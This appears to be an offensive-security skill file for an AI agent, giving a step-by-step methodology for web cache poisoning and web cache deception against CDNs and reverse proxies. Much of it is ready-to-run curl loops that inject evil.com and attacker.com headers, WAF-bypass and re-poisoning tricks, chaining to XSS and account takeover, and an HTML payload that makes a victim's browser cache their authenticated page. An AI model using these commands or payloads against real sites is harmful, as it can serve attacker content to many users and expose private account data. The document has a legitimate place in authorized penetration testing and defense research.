---
name: Web Cache Poisoning & Deception
description: Poison shared CDN/proxy caches to serve attacker content to victims (WCP), or trick caches into storing victims' private authenticated pages (WCD) via unkeyed headers and path tricks.
tags: [cache-poisoning, web-cache-deception, cdn, unkeyed-headers, exploitation]
recommended_tools: [http_request, http_repeater, http_intruder, curl, httpx_probe, nuclei_scan, python3]
vuln_classes: []
domain: web
phase: exploitation
provenance: {source: uphiago/recon-skills, paths: [redteam/hunt-cache-poison/SKILL.md, recon/cache-attack/SKILL.md]}
---

# Web Cache Poisoning & Deception

Two related attacks against shared caches (CDNs and reverse proxies: Cloudflare, CloudFront,
Fastly, Akamai, Varnish, Nginx `proxy_cache`, GCS/GCP edge):

- **Web Cache Poisoning (WCP)** — the attacker sends a request whose *unkeyed* input (a header,
  parameter, or smuggled request) is reflected into a response the cache then stores. Every
  subsequent victim requesting that URL is served the attacker-controlled response. One request,
  mass exploitation — blast radius scales to the whole CDN edge.
- **Web Cache Deception (WCD)** — the attacker tricks the cache into storing a victim's *private,
  authenticated* response (account page, tokens, PII) under a static-looking key, then reads it
  back with no authentication.

Why it is high value: a single poisoned entry can affect thousands or millions of users
simultaneously, and it persists for the full `Cache-Control: max-age` / `Age` TTL.

## When to use

- Response headers show a cache: `X-Cache`, `X-Cache-Status`, `Age`, `CF-Cache-Status`,
  `X-Cache-Hits`, `Via`, `X-Served-By`, `X-Timer`, `Surrogate-Control`.
- Target sits behind a CDN or reverse proxy.
- Surface recon found no direct app bugs — pivot to the infrastructure/cache layer.
- URL paths accept file-extension or delimiter manipulation (`.css`, `.js`, `.json`).

## Highest-value targets

- **CDN-served assets** (`cdn.*`, CloudFront distributions, Fastly/Akamai edges) — poison affects
  every global visitor.
- **Authentication / account endpoints served through caches** — leads to account takeover (the
  highest-severity variant).
- **Asset CDNs delivering JS/CSS** — XSS payload delivery at scale.
- **SaaS multi-tenant platforms** — one poisoned response bleeds across all tenants sharing a
  cache key.
- **Update/download servers** (`updates.*`, `downloads.*`) — cached error responses = mass DoS.
- **Affiliate / link-shortener flows** (`/link/`, `/go/`, `/ref/`, `/out/`) — reflected
  destination URLs cached globally enable link hijacking and affiliate fraud.

## Attack surface signals

Subdomains: `cdn.`, `assets.`, `static.`, `updates.`, `downloads.`.
Static-looking paths on dynamic content: `/path/to/page.css`, `/account.php/nonexistent.jpg`.
Servers that reflect unvalidated headers (`Host`, `X-Forwarded-Host`, `X-Original-URL`) into
redirects, canonical links, CSP, `og:` meta tags, `<script src>`, or form actions.

Dangerous unkeyed-input header candidates:

```
X-Forwarded-Host        X-Host                  X-Forwarded-Server
X-Forwarded-Scheme      X-Forwarded-Proto       X-Forwarded-Port
X-HTTP-Host-Override     X-Original-URL          X-Rewrite-URL
Forwarded               X-HTTP-Method-Override   True-Client-IP
X-Amz-Website-Redirect-Location
```

## Methodology

### 1. Map the cache infrastructure

Send a `GET` and inspect response headers to identify the caching layer and TTL knobs.

```bash
curl -skI "https://TARGET/" | grep -iE "age|x-cache|cf-cache-status|via|x-served-by|x-cache-hits|x-timer|surrogate-control|server"
```

CDN-specific first moves:
- **CloudFront** → WCD with path-delimiter tricks.
- **Cloudflare** → WCP with unkeyed headers; also test Cache Deception Armor allowlist gaps.
- **Varnish** → WCD with extension forcing.
- **Akamai** → WCP with `X-Forwarded-Host`; consider hop-by-hop smuggling (see Bypasses).

### 2. Confirm the response is actually cached

Send two identical requests; if `Age` increments (or the second shows `HIT`), the response is
being stored.

```bash
curl -skI "https://TARGET/page" | grep -iE "age|x-cache|cf-cache"
curl -skI "https://TARGET/page" | grep -iE "age|x-cache|cf-cache"
```

### 3. Identify unkeyed inputs (WCP)

Vary one header at a time under a **throwaway cache-busting key** so probes land on a fresh MISS
and never store poison under the real, victim-shared key. Do **not** rely on client-sent
`Cache-Control: no-cache` — per RFC 7234 it requests revalidation, not skip-storage, and
Cloudflare/Fastly/Akamai generally ignore it on cacheable assets. Use a unique `?cb=<random>`.

```bash
CB="cb=$RANDOM"
curl -skI "https://TARGET/?$CB" -H "X-Forwarded-Host: canary.attacker.com" | grep -i "canary.attacker.com\|location"
```

Bulk header sweep (each under the same busting key):

```bash
CB="cb=$(date +%s)"
for h in \
  "X-Forwarded-Host: evil.com" "X-Host: evil.com" "X-Forwarded-Scheme: http" \
  "X-Forwarded-Proto: http" "X-Forwarded-Port: 8443" "Forwarded: for=evil.com;host=evil.com" \
  "X-Original-URL: /admin" "X-Rewrite-URL: /admin" "X-HTTP-Method-Override: HEAD" \
  "X-Amz-Website-Redirect-Location: /malicious"; do
  key="${h%%:*}"; val="${h#*: }"
  resp=$(curl -skI --max-time 10 "https://TARGET/?$CB" -H "$h")
  echo "$resp" | grep -qi "$val" && echo "[REFLECTED] $key -> $val"
done
```

In Burp/HTTP tooling, `http_intruder` over the header wordlist and Param Miner's "Guess headers"
mode are the canonical ways to enumerate unkeyed headers/parameters automatically.

### 4. Test unkeyed query parameters (WCP)

HTTP parameter pollution / cloaking can put attacker input into the stored key while victims hit a
clean key.

```bash
curl -s "https://TARGET/page?cb=1&param=CANARY" | grep CANARY   # reflected?
curl -s "https://TARGET/page?cb=1"                              # served to clean requests?
```

### 5. Prove cache storage (WCP)

Poison a throwaway key, confirm a `HIT`, then read back **without** the malicious header from a
separate client/IP/incognito session.

```bash
CB="cb=POISON_$(date +%s)"; MAL="evil.attacker.com"
curl -sk "https://TARGET/?$CB" -H "X-Forwarded-Host: $MAL" -o /dev/null -w "poison: %{http_code}\n"
curl -skI "https://TARGET/?$CB" | grep -iE "x-cache.*hit|cf-cache-status.*HIT" && \
  curl -sk "https://TARGET/?$CB" | grep -q "$MAL" && echo "[CRITICAL] poison stored in cache"
```

### 6. Web Cache Deception (WCD)

Append fake static extensions or delimiters to an authenticated dynamic route. If the origin
serves the parent dynamic page but the cache stores it as "static," the private response is now
publicly readable.

```bash
# With the victim's authenticated session, force the static-looking fetch:
curl -sk -b "session=VICTIM" "https://TARGET/account/profile.css" -H "Accept: text/css,*/*"
# Then read it back with NO auth from another client:
curl -sk "https://TARGET/account/profile.css" | grep -iE "email|token|user|auth"
# Confirm HIT:
curl -skI "https://TARGET/account/profile.css" | grep -iE "x-cache.*hit|cf-cache-status.*HIT"
```

WCD path/extension ladder (least → most exotic):

```
/profile          .css   .js   .json   .png   .ico   .avif
/profile;.css              (path-parameter delimiter)
/profile.php/.css          (extra path segment origin ignores)
/profile.php/nonexistent.jpg
/profile?cb=123.css        (query-string extension trick)
/profile%2f..%2findex.css  (encoded-traversal normalization gap)
/profile..;.css
```

### 7. Test cache-poisoning DoS

Send a header/value that forces a 4xx/5xx at origin and check whether the cache stores the error,
breaking the URL for all legitimate users.

```bash
curl -sk -H "X-Forwarded-Host: aaaaaaaaaaa.invalid" "https://TARGET/js/app.js" -I
curl -skI "https://TARGET/js/app.js" | grep "HTTP/"   # next clean request errors?
```

### 8. Measure TTL and blast radius

Read `Cache-Control: max-age` and `Age` to gauge poison lifetime. Classify reach: global CDN edge
(worldwide) vs regional cache vs single-server cache — this directly sets severity.

## Reflection sink → impact map (WCP)

| Reflection sink | Impact | Severity |
|---|---|---|
| `<script src="...">` | Stored XSS across every edge visitor | Critical |
| `Location:` header | Mass open redirect | High |
| `<form action="...">` | Credential theft | High |
| `<meta property="og:url">` | Phishing via link-preview spoof | High |
| `<link rel="canonical">` | SEO poisoning | Medium |
| `<link rel="stylesheet">` | CSS injection | Medium |

## Bypass techniques

- **WAF blocks known poison headers** → less-common variants (`X-Host`, `X-Forwarded-Server`,
  `X-HTTP-Host-Override`, `Forwarded: host=evil.com`), value encoding (`evil%2ecom`), case
  variation (`x-forwarded-host`, `X-FORWARDED-HOST`).
- **Edge strips attacker headers** → smuggle them past the WAF via HTTP request smuggling so they
  reach the cache server directly; or abuse HTTP/2→HTTP/1.1 downgrade pseudo-header handling.
- **Caching requires auth** → WCD: append `.css`/`.js` so the response matches an auth-ignoring
  static cache rule.
- **Cache key includes full query string** → parameter pollution (`?legit=1&param=evil` stored,
  victim visits `?legit=1`); or a **fat GET** — send body params the origin processes but the
  cache ignores.
- **Cloudflare Cache Deception Armor** → use an extension absent from its static allowlist (e.g.
  `.avif`) so an authenticated HTML response is cached.
- **Short TTL / rapid purging** → automate re-poisoning just ahead of TTL expiry; target PoPs with
  longer default TTLs.
- **`Cache-Control: private` on sensitive routes** → verify the CDN honors it (some ignore it under
  a global admin cache override); or find an adjacent cacheable endpoint that reflects the same
  data.

## Common root causes (CWE-524, CWE-525, CWE-444)

1. CDN caches on URL path/extension only; origin ignores extra segments the CDN keys on.
2. Reverse proxy forwards `X-Forwarded-Host` to backend URL generation but omits it from the cache
   key.
3. Framework URL normalization (`/account/settings.css` == `/account/settings`) meets an aggressive
   `*.css` cache rule.
4. Multi-tenant cache with no tenant isolation in the key.
5. Error responses cached without excluding 4xx/5xx status codes.
6. Lazy/absent `Vary` header, or a CDN that strips `Vary` on asset types.
7. Third-party integrations reflecting destination URLs into cacheable metadata.

## Gate 0 — deterministic validation (do before claiming impact)

1. **Attacker capability:** a *separate, unauthenticated request from a different client/IP*
   receives the poisoned/deceived response. If only your own browser sees it, it is a self-cache —
   N/A, not a finding.
2. **Victim loss** is one of: (a) session/credential compromise via reflected content, (b)
   attacker JS execution via a poisoned asset, (c) service denial (legit requests error), or (d)
   sensitive data disclosed to other users. "Weird response headers" alone is not impact.
3. **10-minute clean repro:** poison request → wait for store → fetch from incognito/different IP →
   observe poisoned/private response. Confirm the `HIT` via `X-Cache: Hit` or
   `CF-Cache-Status: HIT`. If you cannot reproduce with a second client, the cache is not storing
   the poison and the finding is not ready.

Then restore clean state: flush/expire your test cache entries after verification.

## Pitfalls

- **Reflection ≠ storage.** A reflected header may not be cached — always prove storage with a
  second, header-free request.
- **Cache buster is mandatory** on every probe, or you poison real users under the live key.
- **Key normalization** — CDNs normalize URLs before keying; test case variants, trailing slashes,
  and ignored params.
- **Method awareness** — some caches store a HEAD (empty) body under the GET key (see GitLab CVE
  case below).

## Chaining

- **XSS** — WCP is the multiplier that turns self-only reflected XSS into stored XSS for every edge
  visitor: `X-Forwarded-Host: attacker.com` poisons a cached `<script src>` so all visitors execute
  attacker JS for the full max-age.
- **HTTP request smuggling** — CL.TE/TE.CL desync delivers poison headers to the cache backend past
  a WAF that stripped them at the edge; the smuggled request's response becomes the cached entry
  for the next victim.
- **Auth bypass / ATO** — WCD converts an authenticated `/account/profile.css` into a publicly
  cached response containing the victim's email and session tokens → full account takeover.

## Real-world CVEs & disclosed reports (2017–2024)

- **Shopify — X-Forwarded-Host poisoning** (HackerOne #977851, 2020). `GET /any-path` +
  `X-Forwarded-Host: attacker.com` persisted the attacker host in cached responses across
  `apps.shopify.com` and localized subdomains. Root cause: XFH drove asset/redirect URL generation
  but was not part of the cache key. Bounty escalated $1,300 → $6,300.
- **HackerOne — X-Forwarded-Port cache-poisoning DoS** (H1 #409370, 2018). `X-Forwarded-Port: 1`
  cached a 301 whose `Location` pointed users at port 1, breaking access. Foundational H1-on-H1
  case, $2,500.
- **GitLab — X-HTTP-Method-Override cache-poisoning DoS** (H1 #1160407, 2021). `GET /assets/…​js` +
  `X-HTTP-Method-Override: HEAD` made the GCS backend return an empty body that the (non
  method-aware) CDN cached as the canonical GET response. $2,500.
- **PayPal — original Web Cache Deception** (Omer Gil, 2017). `GET /myaccount/home/foo.css` served
  the full authenticated account page, cached as static `.css` for ~5 hours. PortSwigger Top-10 Web
  Hacking Technique of 2017 (#2). $3,000.
- **Cloudflare — Cache Deception Armor bypass via `.avif`** (H1 #1391635, 2022). `/account/me.avif`
  slipped past Armor's incomplete static extension allowlist, caching the authenticated HTML.
- **Akamai — hop-by-hop header smuggling → server-side edge poisoning** (Tediosi & Mariani, 2022).
  `Connection: Content-Length` made Akamai's first proxy strip `Content-Length` as hop-by-hop; the
  second proxy treated the body as a second request whose response was cached at the edge for nearby
  IPs. >$50K total across PayPal/Airbnb/Goldman Sachs.
- **James Kettle — "Gotta cache 'em all": path-normalization & WCD across CDNs** (PortSwigger
  Research, 2024). Cache-vs-origin disagreements on delimiter/path normalization let the cache store
  dynamic/authenticated responses under static-looking keys on Cloudflare, Fastly, and GCP.
  PortSwigger Top-10 Web Hacking Techniques 2024.

## WCD + SameSite=Lax combo

WCD normally fails against `SameSite=Lax` cookies (not sent cross-site), but Lax cookies *are* sent
on top-level navigation (meta refresh, anchor click, form GET). Deliver a top-level navigation to
the WCD URL so the victim's browser attaches its cookies, caching the authenticated response:

```html
<meta http-equiv="refresh" content="0; url=https://TARGET/profile.php/.css">
<a id="f" href="https://TARGET/profile.php/.css">continue</a>
<script>document.getElementById('f').click();</script>
```
